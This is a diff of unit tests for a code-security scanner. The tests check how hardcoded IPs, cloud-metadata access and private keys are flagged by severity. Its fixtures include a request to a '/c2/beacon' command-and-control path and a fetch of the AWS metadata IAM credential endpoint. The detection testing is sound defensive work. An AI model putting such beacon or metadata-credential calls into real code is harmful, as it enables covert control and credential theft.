@@ -196,10 +196,30 @@ def test_detect_python_subprocess():
     assert any("subprocess" in str(o.evidence) for o in obs)
 
 
-def test_detect_hardcoded_ip():
+def test_detect_hardcoded_public_ip():
+    content = 'requests.get("http://45.33.32.156/c2/beacon")'
+    obs = detect_suspicious_imports(content, "client.py")
+    assert any("hardcoded_ip" in o.category for o in obs)
+    assert any(o.severity == ObservationSeverity.HIGH for o in obs)
+
+
+def test_detect_private_ip_in_non_test():
     content = 'requests.get("http://192.168.1.100/c2/beacon")'
     obs = detect_suspicious_imports(content, "client.py")
     assert any("hardcoded_ip" in o.category for o in obs)
+    assert any(o.severity == ObservationSeverity.MEDIUM for o in obs)
+
+
+def test_private_ip_in_test_file_not_flagged():
+    content = 'requests.get("http://192.168.1.100/test")'
+    obs = detect_suspicious_imports(content, "tests/test_client.py")
+    assert not any("hardcoded_ip" in o.category for o in obs)
+
+
+def test_cloud_metadata_ip_always_high():
+    content = 'fetch("http://169.254.169.254/latest/meta-data/iam")'
+    obs = detect_suspicious_imports(content, "tests/test_aws.py")
+    assert any("cloud_metadata" in o.category for o in obs)
     assert any(o.severity == ObservationSeverity.HIGH for o in obs)
 
 
@@ -286,9 +306,16 @@ def test_legitimate_deps_no_typosquat():
 
 def test_detect_private_key():
     content = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
-    obs = detect_secrets(content, "key.pem")
+    obs = detect_secrets(content, "deploy/secrets.py")
     assert any("private_key" in o.category for o in obs)
     assert any(o.severity == ObservationSeverity.HIGH for o in obs)
+
+
+def test_private_key_in_test_is_info():
+    content = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----"
+    obs = detect_secrets(content, "tests/fixtures/test_key.pem")
+    assert any("private_key" in o.category for o in obs)
+    assert all(o.severity == ObservationSeverity.INFO for o in obs if "private_key" in o.category)
 
 
 def test_detect_aws_key():
